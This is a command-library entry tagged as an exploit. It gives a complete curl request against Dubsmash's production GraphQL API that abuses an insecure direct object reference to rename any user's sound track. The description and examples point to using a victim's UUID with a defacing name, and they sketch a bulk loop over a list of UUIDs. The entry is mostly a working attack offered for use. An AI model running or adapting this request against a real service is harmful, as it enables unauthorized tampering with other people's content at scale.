---
id: cmd-curl-update-sound
data: >-
  curl -i -s -k -X 'POST' -H 'Host: gateway-production.dubsmash.com' -H 'X-Dmac:
  ' -H 'X-Remote-Config-Values: []' -H 'X-Time: 1613158267' -H 'User-Agent:
  Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1)
  Alamofire/5.4.0' -H 'X-Accept-Content-Language: en_IN' -H 'X-Device-Timezone:
  19800' -H 'X-Device-Language: en' -H 'X-Device-Country: IN' -H
  'X-Build-Number: 45431' -H 'Content-Length: 676' -H 'X-App-Version: 5.20.0' -H
  'X-Platform: ios' -H 'Connection: close' -H 'Authorization: Bearer XXXXXX' -H
  'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H
  'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H 'Accept: application/json' -H
  'Content-Type: application/json' -H 'X-Dmac-Version: 2' -H 'If-None-Match:
  W/\"88-IVjhmW06Njcacim4nwHnJNviYsE\"' -b ' cfduid=' --data-binary
  '{"query":"mutation UpdateSound($input: UpdateSoundInput!) {\n
  updateSound(input: $input) {\n** typename\n sound {\n **typename\n
  ...SoundFragment\n }\n
  }\n}\n...","variables":{"input":{"uuid":"a687eb61ad814a09a8a85cedef7837f3","name":"test12355556777"}}}'
  'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'
tags:
  - graphql
  - mutation
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.277Z'
verified: false
validated: true
submitted: true
---
# curl-update-sound-title

## Command

```bash
curl -i -s -k -X 'POST' -H 'Host: gateway-production.dubsmash.com' -H 'X-Dmac: ' -H 'X-Remote-Config-Values: []' -H 'X-Time: 1613158267' -H 'User-Agent: Dopesmash/5.20.0 (com.mobilemotion.dubsmash; build:45431; iOS 14.0.1) Alamofire/5.4.0' -H 'X-Accept-Content-Language: en_IN' -H 'X-Device-Timezone: 19800' -H 'X-Device-Language: en' -H 'X-Device-Country: IN' -H 'X-Build-Number: 45431' -H 'Content-Length: 676' -H 'X-App-Version: 5.20.0' -H 'X-Platform: ios' -H 'Connection: close' -H 'Authorization: Bearer XXXXXX' -H 'X-Dubsmash-Device-Id: 0675382B-668E-4EB7-8313-ED96BC132DC9' -H 'Accept-Language: en-IN;q=1.0, hi-IN;q=0.9' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'X-Dmac-Version: 2' -H 'If-None-Match: W/\"88-IVjhmW06Njcacim4nwHnJNviYsE\"' -b ' cfduid=' --data-binary '{"query":"mutation UpdateSound($input: UpdateSoundInput!) {\n updateSound(input: $input) {\n** typename\n sound {\n **typename\n ...SoundFragment\n }\n }\n}\n...","variables":{"input":{"uuid":"a687eb61ad814a09a8a85cedef7837f3","name":"test12355556777"}}}' 'https://gateway-production.dubsmash.com/graphql?build_number=45431&platform=ios'
```

## Description

This command performs a GraphQL mutation to update a sound track's title in Dubsmash's API, exploiting IDOR by using any UUID; replace variables for targeting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H 'Authorization: Bearer XXXXXX'` | Valid Bearer token (replace XXXXXX) | Yes |
| `variables.input.uuid` | Target sound UUID in JSON body | Yes |
| `variables.input.name` | New title (e.g., malicious string) in JSON body | Yes |
| `build_number=45431&platform=ios` | App version params | Yes |

## Examples

### Basic Usage

```bash
# As above, with victim's UUID and defacing name
```

### Advanced Usage

```bash
# Script for bulk: for uuid in uuids.txt; do curl ... --data-binary "...\"uuid\":\"$uuid\"..."; done
```

## Expected Output

HTTP 200 with JSON: {"data":{"updateSound":{"sound":{"uuid":"a687eb61...","name":"test12355556777"}}}}

## Related

- [[commands/curl-fetch-recommended-sounds]]
- [[procedures/Replay-and-Modify-UpdateSound-Mutation-for-IDOR]]
